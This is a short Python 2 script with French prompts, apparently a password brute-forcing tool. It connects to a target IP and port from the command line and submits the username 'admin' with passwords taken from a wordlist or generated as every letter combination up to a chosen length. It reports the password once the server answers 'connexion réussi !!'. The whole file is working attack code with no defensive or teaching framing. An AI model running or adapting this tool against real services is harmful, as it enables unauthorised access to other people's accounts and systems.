#!/usr/bin/env python
#-*-coding:UTF-8-*-
import socket
import time
import itertools, sys, os
from string import ascii_letters


ip=sys.argv[1]
port=int(sys.argv[2])
id="admin"
buf=20
reponse=''


def bruteforce_dico(src):
    file=open(src,'r')
    dico=file.readlines()
    file.close()
    for passwd in dico:
        passwd=passwd.strip()
        reponse=s.recv(buf)
        s.send(id)
        reponse=s.recv(buf)
        s.send(passwd)
        reponse=s.recv(buf)
        print reponse
        print ".",
        if reponse == "connexion réussi !!":
            print "\nMot de passe trouvé :",passwd
            break

def bruteforce(max):
    #Génère l'alphabet a-zA-Z
    alphabet = [car for car in ascii_letters]
    for i in range (1,max+1):
        dictionary = itertools.product(alphabet, repeat=i)
        for item in dictionary:
            passwd="".join(item)
            reponse=s.recv(buf)
            s.send(id)
            reponse=s.recv(buf)
            s.send(passwd)
            print ".",
            reponse=s.recv(buf)
            if reponse == "connexion réussi !!":
                print "\nMot de passe trouvé :",passwd
                break

if ip != '' and port != '':
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    print "connexion a", ip
    s.connect((ip,port))
    print 'connexion faite'
    print "1°) bruteforce par Dictionaire "
    print "2°) bruteforce à la volée"
    choix=input("Votre choix: ")
    print 'démarrage du bruteforce'
    if choix == 1:
        file=raw_input("Votre Dictionaire : ")
        bruteforce_dico(file)
    elif choix == 2:
        max=input("Nombre maximun a testé: ")
        bruteforce(max)

else:
    print "Argument 1 : ip de la cible\n"
    print "Argument 2 : port de la cible\n"
